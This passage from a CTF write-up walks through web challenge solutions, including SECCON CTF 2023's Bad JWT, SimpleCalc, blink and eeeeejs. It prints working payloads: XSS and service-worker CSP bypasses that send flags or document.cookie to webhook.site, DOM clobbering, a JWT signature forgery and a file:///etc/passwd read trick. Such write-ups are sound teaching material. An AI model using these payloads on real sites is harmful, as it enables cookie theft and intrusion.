punctuation">,</span> RegExp<span class="token punctuation">,</span> Promise<span class="token punctuation">,</span> Symbol<span class="token punctuation">,</span> BigInt<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>fnCons<span class="token punctuation">)</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> c <span class="token keyword">of</span> cons<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    Object<span class="token punctuation">.</span><span class="token function">freeze</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>    Object<span class="token punctuation">.</span><span class="token function">freeze</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> code <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">console.log(1)</span><span class="token template-punctuation string">`</span></span><span class="token keyword">const</span> argNames <span class="token operator">=</span> <span class="token function">allKeys</span><span class="token punctuation">(</span>globalThis<span class="token punctuation">)</span><span class="token keyword">const</span> fn <span class="token operator">=</span> <span class="token function">Function</span><span class="token punctuation">(</span><span class="token operator">...</span>argNames<span class="token punctuation">,</span> code<span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token function-variable function">callUserFn</span> <span class="token operator">=</span> <span class="token parameter">t</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'User function error'</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token comment">// hardening</span><span class="token function">hardening</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">callUserFn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>argNames</code> collects the names of everything that <code>global</code> can access. This way, all the names can be treated as function parameters. It feels something like this:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token parameter">console<span class="token punctuation">,</span> Object<span class="token punctuation">,</span> String<span class="token punctuation">,</span> Number<span class="token punctuation">,</span> fetch<span class="token punctuation">,</span><span class="token operator">...</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>So, no matter what you get, it will be <code>undefined</code>. When calling, <code>this</code> is also passed as <code>Object.create(null)</code>, so it’s not easy to escape.</p><p>Maple’s expected solution involves using try-catch and throwing an error to retrieve the value:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">null</span><span class="token punctuation">.</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  TypeError <span class="token operator">=</span> e<span class="token punctuation">.</span>constructor<span class="token punctuation">&#125;</span>Error <span class="token operator">=</span> <span class="token class-name">TypeError</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token class-name">__proto__</span><span class="token punctuation">.</span>constructorError<span class="token punctuation">.</span><span class="token function-variable function">prepareStackTrace</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> structuredStackTrace</span><span class="token punctuation">)</span> <span class="token operator">=></span> structuredStackTrace<span class="token keyword">try</span><span class="token punctuation">&#123;</span>  <span class="token keyword">null</span><span class="token punctuation">.</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> g <span class="token operator">=</span> e<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>arguments<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>target  <span class="token keyword">if</span> <span class="token punctuation">(</span>g<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">throw</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">message</span><span class="token operator">:</span> g <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>He used a similar technique before in the DiceCTF 2022 - undefined challenge.</p><p>However, there is an easier solution for this challenge, utilizing the default behavior of <code>this</code>, as shown below:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>In JavaScript, when calling a function, the default <code>this</code> will be the global object. By using this, you can bypass restrictions.</p><p>But what can you do after bypassing the restrictions? It seems that you can’t do much in the worker because the main thread’s <code>setHTML</code> filters the content, and the CSP of this challenge is <code>default-src &#39;self&#39; &#39;unsafe-eval&#39;</code>.</p><p>The key lies in the blob URL. You can create a new HTML using blob and load it. The origin of this new HTML is the same as the original one:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> u <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">this<span class="token punctuation">.</span>Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'&lt;h1>peko&lt;/h1>'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'text/html'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>location <span class="token operator">=</span> u<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>What surprised me about this challenge is that the <code>&lt;meta&gt;</code> redirect can also be redirected to a blob URL. So, by combining meta redirect, you can make the top-level page your own HTML and bypass the sanitizer’s restrictions.</p><p>However, at this point, the CSP is inherited, so you still need to bypass the CSP. Here, you can use <code>worker.js</code> again, load it as a regular script, and execute XSS under the main thread.</p><p>This challenge is really interesting, and the use of blob is quite clever.</p><h3><span id="amf-4-solves">AMF (4 solves)</span></h3><p>I’m a bit lazy to study Python stuff, so I’ll leave it for now. The author has written a writeup.</p><h3><span id="harmony-2-solves">Harmony (2 solves)</span></h3><p>This challenge involves various Electron black magic.</p><p>In Chromium, domains ending with <code>.localhost</code> are ignored when using the file protocol, for example:</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; failfile:&#x2F;&#x2F;www.youtube.com.attacker.com&#x2F;etc&#x2F;passwd&#x2F;&#x2F; successfile:&#x2F;&#x2F;www.youtube.com.localhost&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>(I feel like I accidentally came across this code before)</p><p>And <code>file://</code> is filtered out by DOMPurify, but since the webpage itself is a file, you can change it to use <code>//</code> to bypass the check.</p><p>Next, <code>file://</code> is same-origin in Electron, so after loading your own file, you can access <code>top.api</code>.</p><p>Finally, by combining some prototype pollution techniques, you can achieve RCE (I didn’t study the second half in detail, you can refer to the author’s writeup).</p><h3><span id="sharers-world-1-solve">Sharer’s World (1 solve)</span></h3><p>The key to this challenge is something called SXG: <a href="https://web.dev/signed-exchanges/">https://web.dev/signed-exchanges/</a></p><p>I had never heard of this before this competition, and it turns out that the reference material on web.dev was available as early as 2021. It seems like I’ve been lagging behind for too long.</p><p>Simply put, SXG allows you to sign a webpage with a certificate. When other websites send this signed resource, the browser treats it as if it is from the certified website.</p><p>For example, suppose someone from example.com signs a webpage with their private key, creating an example.sxg file. Then I get this file and put it on my server with the URL: <a href="https://huli.tw/example.sxg">https://huli.tw/example.sxg</a></p><p>When a user visits <a href="https://huli.tw/example.sxg">https://huli.tw/example.sxg</a>, the content will be the previous website, and the URL will become example.com, as if this webpage came directly from example.com.</p><h2><span id="seccon-ctf-2023">SECCON CTF 2023</span></h2><p>As a JavaScript enthusiast, I really liked the challenges in this SECCON CTF. They were full of JavaScript. Although I couldn’t solve some of the challenges, I still learned a lot.</p><h3><span id="bad-jwt-107-solves">Bad JWT (107 solves)</span></h3><p>The goal of this challenge is to generate a JWT with <code>isAdmin: true</code>. The key lies in the logic of JWT verification:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> algorithms <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token function-variable function">hs256</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">data<span class="token punctuation">,</span> secret</span><span class="token punctuation">)</span> <span class="token operator">=></span>     <span class="token function">base64UrlEncode</span><span class="token punctuation">(</span>crypto<span class="token punctuation">.</span><span class="token function">createHmac</span><span class="token punctuation">(</span><span class="token string">'sha256'</span><span class="token punctuation">,</span> secret<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function-variable function">hs512</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">data<span class="token punctuation">,</span> secret</span><span class="token punctuation">)</span> <span class="token operator">=></span>     <span class="token function">base64UrlEncode</span><span class="token punctuation">(</span>crypto<span class="token punctuation">.</span><span class="token function">createHmac</span><span class="token punctuation">(</span><span class="token string">'sha512'</span><span class="token punctuation">,</span> secret<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> <span class="token function-variable function">createSignature</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">header<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> secret</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">stringifyPart</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">stringifyPart</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>  <span class="token keyword">const</span> signature <span class="token operator">=</span> algorithms<span class="token punctuation">[</span>header<span class="token punctuation">.</span>alg<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> secret<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> signature<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>If <code>header.alg</code> is <code>constructor</code>, it becomes <code>const signature = Object(data,secret)</code>, and the resulting signature becomes a string object that only contains data, ignoring the secret:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Object</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token string">"secret"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// String &#123;'data'&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Therefore, you just need to construct a signature that is the same.</p><p>For a more detailed writeup, you can refer to: <a href="https://github.com/xryuseix/CTF_Writeups/tree/master/SECCON2023">https://github.com/xryuseix/CTF_Writeups/tree/master/SECCON2023</a></p><h3><span id="simplecalc-23-solves">SimpleCalc (23 solves)</span></h3><p>This question allows you to execute arbitrary JavaScript, but you need to use fetch with the X-FLAG header to get the flag. However, it will be blocked by CSP:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> js_url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>req<span class="token punctuation">.</span>hostname<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">PORT</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/js/index.js</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Security-Policy'</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">default-src </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>js_url<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> 'unsafe-eval';</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>By creating a response with a header that is too large and embedding it in an iframe, you can obtain a same-origin page without CSP, bypassing CSP:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> f<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>f<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://localhost:3000/js/index.js?q=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">20000</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>f<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        f<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string-property property">'X-FLAG'</span><span class="token operator">:</span> <span class="token string">'a'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token literal-property property">credentials</span><span class="token operator">:</span><span class="token string">'include'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> res<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">flag</span> <span class="token operator">=></span> location<span class="token operator">=</span><span class="token string">'https://webhook.site/2ba35f39-faf4-4ef2-86dd-d85af29e4512?q='</span><span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Interestingly, using <code>window.open</code> does not work. It is said that window.open will redirect the error page to a place like <code>chrome://error</code>, so the origin becomes null.</p><p>The expected solution for this question is actually a service worker. It can be used under http + localhost to remove the CSP header by relying on the service worker.</p><p>Below is @DimasMaulana’s exploit:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quotetarget <span class="token operator">=</span> <span class="token string">"http://localhost:3000"</span>webhook <span class="token operator">=</span> <span class="token string">"https://webhook.site/9a2fbf03-9a64-49d1-9418-3728945d5e10"</span>rmcsp <span class="token operator">=</span> <span class="token triple-quoted-string string">"""self.addEventListener("fetch", (ev) => &#123;    console.log(ev)    let headers = new Headers()    headers.set("Content-Type","text/html")    if (/\/js\//.test(ev.request.url))&#123;        ev.respondWith(new Response("&lt;script>fetch('/flag',&#123;headers:&#123;'X-FLAG':'1'&#125;,credentials:'include'&#125;).then(async r=>&#123;location='"""</span><span class="token operator">+</span>webhook<span class="token operator">+</span><span class="token triple-quoted-string string">"""?'+await r.text()&#125;)&lt;/script>",&#123;headers&#125;))    &#125;&#125;);console.log("registered2")document = &#123;&#125;document.getElementById = ()=>&#123;return &#123;innerText:"testing"&#125;&#125;"""</span>workerUrl <span class="token operator">=</span> <span class="token string">"/js/index.js?expr="</span><span class="token operator">+</span>quote<span class="token punctuation">(</span>rmcsp<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"navigator.serviceWorker.register('"</span><span class="token operator">+</span>workerUrl<span class="token operator">+</span><span class="token string">"');setInterval(()=>&#123;location='/js/test'&#125;,2000)"</span><span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>payload <span class="token operator">=</span> target<span class="token operator">+</span><span class="token string">"/js/..%2f?expr="</span><span class="token operator">+</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3><span id="blink-14-solves">blink (14 solves)</span></h3><p>The core code for this question is as follows:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">createBlink</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">html</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> sandbox <span class="token operator">=</span> <span class="token function">wrap</span><span class="token punctuation">(</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#viewer"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// I believe it is impossible to escape this iframe sandbox...</span>  sandbox<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> sandboxAttribute<span class="token punctuation">;</span>  sandbox<span class="token punctuation">.</span>width <span class="token operator">=</span> <span class="token string">"100%"</span><span class="token punctuation">;</span>  sandbox<span class="token punctuation">.</span>srcdoc <span class="token operator">=</span> html<span class="token punctuation">;</span>  <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">(</span>sandbox<span class="token punctuation">.</span>onload <span class="token operator">=</span> resolve<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> target <span class="token operator">=</span> <span class="token function">wrap</span><span class="token punctuation">(</span>sandbox<span class="token punctuation">.</span>contentDocument<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>  target<span class="token punctuation">.</span>popover <span class="token operator">=</span> <span class="token string">"manual"</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> id <span class="token operator">=</span> <span class="token function">setInterval</span><span class="token punctuation">(</span>target<span class="token punctuation">.</span>togglePopover<span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token function">clearInterval</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>    sandbox<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>It is not possible to bypass the sandbox in the iframe, but the key is the line of code <code>setInterval(target.togglePopover, 400)</code>.</p><p>If <code>target.togglePopover</code> is a string, it can be used as an eval.</p><p>And <code>target</code> is <code>sandbox.contentDocument.body</code>, which can be used to DOM clobber <code>document.body</code> with <code>name</code>, and then clobber <code>togglePopover</code> to complete the task.</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>body</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;a id=togglePopover href=a:fetch(`http://webhook.site/2ba35f39-faf4-4ef2-86dd-d85af29e4512?q=$&#123;document.cookie&#125;`)>&lt;/a><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3><span id="eeeeejs-12-solves">eeeeejs (12 solves)</span></h3><p>Unfortunately, I couldn’t solve this question even after trying for a long time QQ</p><p>The core code for this question is as follows:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> ejs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"ejs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> filename<span class="token punctuation">,</span> <span class="token operator">...</span>query <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ejs<span class="token punctuation">.</span><span class="token function">renderFile</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> query<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>console<span class="token punctuation">.</span>log<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>You can control <code>filename</code> and <code>query</code>, and the goal is XSS.</p><p>The CSP is set to self, which means that as long as you create <code>&lt;script src=/&gt;</code> and construct a valid JS code, you can get the flag.</p><p>But another limitation here is that you can only read files under <code>src</code>, so your template is limited.</p><p>The solution is to use EJS options <code>openDelimiter</code>, <code>closeDelimiter</code>, and <code>delimiter</code> to let EJS parse the template in different ways.</p><p>Because in EJS, <code>&lt;%=</code> can output the content followed by it, and <code>&lt;%-</code> can output unescaped content. So my initial idea was to find a string that matches this pattern, but I only found half of it in the end. I could create <code>&lt;script&gt;</code>, but the attribute content would be encoded. I also found a valid way to generate JavaScript. In short, I couldn’t solve it in the end.</p><p>After the competition, when I looked at other people’s solutions, I realized that I forgot that this question calls node.js to output. The author’s solution is to set debug to true, which allows EJS to output src, and src will include the filename. Then you can use the property of the filename object to pass in any content.</p><p>Alternatively, you can directly put <code>console.log(src)</code> into the template.</p><p>For example, there is a piece of text as follows:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>debug<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>compileDebug <span class="token operator">&amp;&amp;</span> opts<span class="token punctuation">.</span>filename<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  src <span class="token operator">=</span> src <span class="token operator">+</span> <span class="token string">"\n//# sourceURL="</span> <span class="token operator">+</span> sanitizedFilename <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// other codes</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>After doing this:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">ejs<span class="token punctuation">.</span><span class="token function">renderFile</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>  <span class="token string-property property">'src'</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">helllo</span><span class="token operator">:</span> <span class="token string">'world'</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token literal-property property">settings</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token string-property property">'view options'</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token literal-property property">delimiter</span><span class="token operator">:</span> <span class="token string">' '</span><span class="token punctuation">,</span>      <span class="token literal-property property">openDelimiter</span><span class="token operator">:</span> <span class="token string">'if (opts.debug)'</span><span class="token punctuation">,</span>      <span class="token literal-property property">closeDelimiter</span><span class="token operator">:</span> <span class="token string">" if (opts.compileDebug &amp;&amp; opts.filename)"</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The output will 